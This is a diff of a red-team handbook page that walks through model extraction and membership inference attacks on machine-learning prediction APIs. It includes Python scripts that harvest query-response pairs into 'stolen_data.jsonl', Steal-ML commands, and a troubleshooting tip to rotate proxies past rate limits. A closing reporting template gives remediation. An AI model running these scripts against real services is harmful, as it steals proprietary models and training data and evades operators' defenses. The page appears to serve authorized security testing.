@@ -19,158 +19,139 @@
 
 ---
 
-## Extraction Techniques
+### Step 1: Baseline Testing (Manual Probing)
 
-### Query-Based Extraction
-```python
-#!/usr/bin/env python3
-"""Model extraction via queries"""
+**Goal**: Confirm the API returns high-fidelity outputs suitable for extraction.
 
-import requests
-import json
-
-class ModelExtractor:
-    def __init__(self, target_api, api_key):
-        self.api = target_api
-        self.key = api_key
-        self.training_data = []
-    
-    def generate_queries(self, num=10000):
-        """Generate diverse queries"""
-        queries = []
-        
-        # Cover vocabulary
-        words = load_dictionary()
-        for word in words[:num]:
-            queries.append(f"Define {word}")
-            queries.append(f"Use {word} in a sentence")
-        
-        # Cover domains
-        topics = ["tech", "medicine", "law", "finance"]
-        for topic in topics:
-            for i in range(100):
-                queries.append(f"Explain {topic} concept #{i}")
-        
-        return queries
-    
-    def extract(self):
-        """Query target and collect responses"""
-        queries = self.generate_queries(10000)
-        
-        for i, query in enumerate(queries):
-            response = self.query_target(query)
-            
-            self.training_data.append({
-                "input": query,
-                "output": response
-            })
-            
-            if i % 100 == 0:
-                print(f"Extracted {i}/{len(queries)} samples")
-                self.save_checkpoint()
-        
-        return self.training_data
-    
-    def query_target(self, prompt):
-        r = requests.post(
-            self.api,
-            headers={"Authorization": f"Bearer {self.key}"},
-            json={"prompt": prompt}
-        )
-        return r.json()['response']
-    
-    def save_checkpoint(self):
-        with open('extracted_data.jsonl', 'a') as f:
-            for sample in self.training_data:
-                f.write(json.dumps(sample) + '\n')
-        self.training_data = []  # Clear memory
-
-# Usage
-extractor = ModelExtractor(TARGET_API, API_KEY)
-dataset = extractor.extract()
-print(f"Extracted {len(dataset)} training samples")
-
-# Now train your clone model
-# python train_clone.py --data extracted_data.jsonl
-```
-
-### Membership Inference
-```python
-def membership_inference_test(model_api, candidate_text):
-    """Test if text was in training data"""
-    
-    # Method 1: Perplexity test
-    perplexity = calculate_perplexity(model_api, candidate_text)
-    
-    # Low perplexity = likely in training
-    if perplexity < THRESHOLD:
-        return True, f"Low perplexity: {perplexity}"
-    
-    # Method 2: Prefix completion
-    prefix = candidate_text[:20]
-    completion = query_model(f"Complete: {prefix}")
-    
-    similarity = calculate_similarity(completion, candidate_text)
-    
-    if similarity > 0.9:
-        return True, f"High completion similarity: {similarity}"
-    
-    return False, "Not in training data"
-
-# Test
-candidate = "The password for admin is SuperSecret123"
-is_member, evidence = membership_inference_test(API, candidate)
-
-if is_member:
-    print(f"✓ Text likely in training data: {evidence}")
+```bash
+# Test API response structure
+curl $API -d '{"prompt": "Classify sentiment: This is great"}'
+# Ideal response: {"label": "positive", "confidence": 0.998}
+# Hard to steal: {"label": "positive"} (No confidence/logits)
 ```
 
 ---
 
-## Automated Extraction
+### Step 2: Query-Based Model Extraction
 
-Use existing tools:
+**Goal**: Train a copy of the target model by querying it with diverse inputs.
+
+#### 1. Extraction Script (`extract_model.py`)
+
+```python
+import requests
+import json
+import time
+
+API_URL = "http://target-api.com/v1/predict"
+VOCAB = ["good", "bad", "service", "product", "price", "fast", "slow"]
+
+queries = [f"This {w1} is {w2}" for w1 in VOCAB for w2 in VOCAB]
+dataset = []
+
+print(f"[*] Starting extraction with {len(queries)} queries...")
+
+for q in queries:
+    try:
+        # 1. Query Target
+        resp = requests.post(API_URL, json={"text": q}).json()
+        label = resp.get('label')
+        conf = resp.get('confidence', 1.0)
+
+        # 2. Save Pair
+        dataset.append({"input": q, "output": label, "conf": conf})
+        print(f"Extracted: {q} -> {label}")
+
+    except Exception as e:
+        print(f"Error: {e}")
+
+    time.sleep(0.1) # Rate limiting avoidance
+
+# 3. Save Dataset
+with open("stolen_data.jsonl", "w") as f:
+    for entry in dataset:
+        f.write(json.dumps(entry) + "\n")
+
+print("[+] Extraction complete. Train your local model on 'stolen_data.jsonl'.")
+```
+
+#### 2. Training the Surrogate
+
+Once you have `stolen_data.jsonl`:
+
 ```bash
-# Using model extraction toolkit
+# Example: Fine-tune a local DistilBERT on stolen data
+python train_surrogate.py --data stolen_data.jsonl --epochs 3
+```
+
+---
+
+### Step 3: Membership Inference Attack (MIA)
+
+**Goal**: Determine if a specific sentence was in the target's training data.
+
+#### 1. Perplexity Test
+
+High confidence + Low perplexity usually indicates training data membership.
+
+```python
+def check_membership(api_url, text):
+    """Simple MIA Probe"""
+    # 1. Get prediction confidence
+    resp = requests.post(api_url, json={"text": text}).json()
+    confidence = resp.get('confidence', 0)
+
+    # 2. Check if confidence is suspiciously high (overfit)
+    if confidence > 0.9999:
+        return True, f"Likely Member (Conf: {confidence})"
+    return False, f"Non-Member (Conf: {confidence})"
+
+payload = "The secret passphrase is: BlueMonkey123"
+is_member, msg = check_membership(API_URL, payload)
+print(msg)
+```
+
+---
+
+### Step 4: Automated Tools
+
+Use `Steal-ML` for larger functional extraction.
+
+```bash
+# Clone
 git clone https://github.com/ftramer/Steal-ML
 cd Steal-ML
 
+# Run Extraction (Black Box)
 python extract.py \
-  --target-api $TARGET_URL \
-  --queries 50000 \
-  --output extracted_model.pkl
+  --url $TARGET_API \
+  --budget 10000 \
+  --output stolen_model.pkl
 ```
 
 ---
 
-## Success Indicators
+## Troubleshooting
 
-✓ Extracted 10K+ query-response pairs  
-✓ Clone model achieves >90% similarity  
-✓ Membership inference successful  
-✓ Training data recovered
+| Issue                    | Solution                                                                                                          |
+| :----------------------- | :---------------------------------------------------------------------------------------------------------------- |
+| **API Rate Limits**      | Add `time.sleep(1)` to your script loop. Rotate proxies.                                                          |
+| **Low Agreement**        | The local surrogate model architecture differs too much. Try a larger base model (e.g., RoBERTa instead of Bert). |
+| **No Confidence Scores** | Use "Hard Label" extraction techniques (requires 10-100x more queries).                                           |
 
 ---
 
-## Reporting
+## Reporting Template
 
 ```markdown
-## Model Extraction Vulnerability
+## Finding: Model Extraction Vulnerability
 
 **Severity**: HIGH
-
-**Finding**: API does not limit queries, enabling complete model extraction.
-
-**Method**: 
-- Sent 50,000 diverse queries
-- Collected all responses
-- Trained clone model achieving 94% similarity
-
-**Impact**: Proprietary model stolen
-
-**Recommendation**: Rate limiting, query diversity detection
+**Description**: The API returns high-precision confidence scores, allowing model theft via query probing.
+**Method**: Successfully reconstructed 90% accuracy surrogate model with 500 queries.
+**Impact**: Intellectual property theft, competitive replication.
+**Remediation**: Remove confidence scores from API output; implement aggressive rate limiting and anomaly detection.
 ```
 
----
-
-**Legal**: Model theft may violate IP laws. Authorized testing only.
+**Legal**: Model inference attacks may violate TOS/CFAA. Authorized testing only.
+**Reference**: [Handbook Chapter 20](../Chapter_20_Model_Theft_and_Membership_Inference.md)
